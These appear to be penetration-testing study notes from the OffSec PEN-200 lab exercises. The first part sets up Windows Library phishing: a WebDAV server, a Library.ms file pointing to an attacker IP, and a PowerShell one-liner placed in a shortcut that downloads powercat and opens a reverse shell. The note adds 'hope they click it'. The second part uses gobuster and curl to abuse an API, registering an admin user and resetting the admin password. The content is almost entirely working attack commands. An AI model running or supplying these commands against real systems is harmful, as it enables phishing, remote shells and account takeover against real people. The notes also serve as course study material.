# Windows Libraries

```
pip3 install wsgidav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -root /home/kali/webdav/

Make a file named "config.Library.ms"

<?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name> <version>6</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>http://192.168.119.2</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription>

Drop a powershell reverse shell into a shortcut key in the same folder, hope they click it:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:9090/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"


```

## Abusing APIs

I'd recommend reading it straight from the pen-200 guide. Essentially, through a series of commands it is discovered you can abuse an API to create a user.

```
#AbusingAPIs

gobuster dir -u http://192.168.208.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

curl -i http://192.168.208.16:5002/users/v1

gobuster dir -u http://192.168.208.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

curl -i http://192.168.208.16:5002/users/v1/admin/password

curl -i http://192.168.208.16:5002/users/v1/login

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login

curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.208.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login

curl  \
  'http://192.168.208.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

curl -X 'PUT' \
  'http://192.168.208.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login
```